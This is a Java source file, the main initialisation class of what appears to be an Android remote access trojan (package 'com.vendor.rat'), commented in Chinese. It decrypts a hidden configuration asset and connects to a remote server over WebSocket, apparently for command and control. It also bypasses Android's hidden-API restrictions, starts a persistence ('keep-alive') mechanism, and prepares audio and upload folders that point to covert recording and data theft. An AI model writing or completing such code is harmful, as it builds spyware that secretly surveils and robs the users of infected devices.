package com.vendor.rat;

import android.app.Application;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.vendor.rat.config.AppConfig;
import com.vendor.rat.config.ConfigDecryptor;
import com.vendor.rat.keepalive.KeepAliveManager;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.utils.HiddenApiBypass;

import java.io.File;
import java.io.InputStream;

/**
 * 主应用管理器（单例）
 *
 * 初始化阶段:
 *   阶段 1: Application.onCreate → init(Application)
 *   阶段 2: init() 实例方法 → 注册广播、创建目录
 *   阶段 3: unlockedInstance() → 加载配置、启动线程
 */
public class MainApplication {

    private static final String TAG = "MainApplication";

    private static volatile MainApplication instance;
    private static Application application;

    private AppConfig config;
    private volatile boolean initialized = false;

    private MainApplication() {}

    // ============ 静态初始化 (阶段 1) ============

    public static void init(Application app) {
        application = app;
        instance = new MainApplication();

        // 注册 Activity 生命周期回调
        app.registerActivityLifecycleCallbacks(new ActivityLifecycleTracker());

        // 阶段 2
        instance.initInternal();
    }

    public static MainApplication getInstance() {
        return instance;
    }

    public static Application getApplication() {
        return application;
    }

    // ============ 实例初始化 (阶段 2) ============

    private void initInternal() {
        // 创建缓存目录
        createCacheDirs();

        // 异步执行阶段 3
        new Thread(this::unlockedInstance, "init-thread").start();
    }

    // ============ 解锁初始化 (阶段 3) ============

    private void unlockedInstance() {
        try {
            // 1. 加载并解密配置
            loadConfig();

            // 2. 初始化网络管理器
            initNetwork();

            // 3. 绕过隐藏 API 限制
            HiddenApiBypass.bypass();

            // 4. 初始化保活机制
            KeepAliveManager.getInstance().init(application);

            initialized = true;
            Log.i(TAG, "Initialization complete");

        } catch (Exception e) {
            Log.e(TAG, "Initialization failed", e);
        }
    }

    // ============ 配置加载 ============

    private void loadConfig() {
        try {
            InputStream is = application.getAssets().open("config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();

            String encryptedJson = new String(buffer);
            config = ConfigDecryptor.decrypt(encryptedJson);

            Log.d(TAG, "Config loaded successfully");
        } catch (Exception e) {
            Log.e(TAG, "Load config failed, using defaults", e);
            config = AppConfig.getDefault();
        }
    }

    // ============ 网络初始化 ============

    private void initNetwork() {
        NetworkManager.getInstance().init(
            config.getServerHost(),
            config.getWebSocketUrl(),
            config.getDeviceId(application)
        );
    }

    // ============ 辅助方法 ============

    private void createCacheDirs() {
        File audioDir = new File(application.getCacheDir(), "audio");
        if (!audioDir.exists()) audioDir.mkdirs();

        File uploadDir = new File(application.getCacheDir(), "upload");
        if (!uploadDir.exists()) uploadDir.mkdirs();

        File logDir = new File(application.getCacheDir(), "logs");
        if (!logDir.exists()) logDir.mkdirs();
    }

    // ============ Getters ============

    public AppConfig getConfig() { return config; }
    public boolean isInitialized() { return initialized; }
}
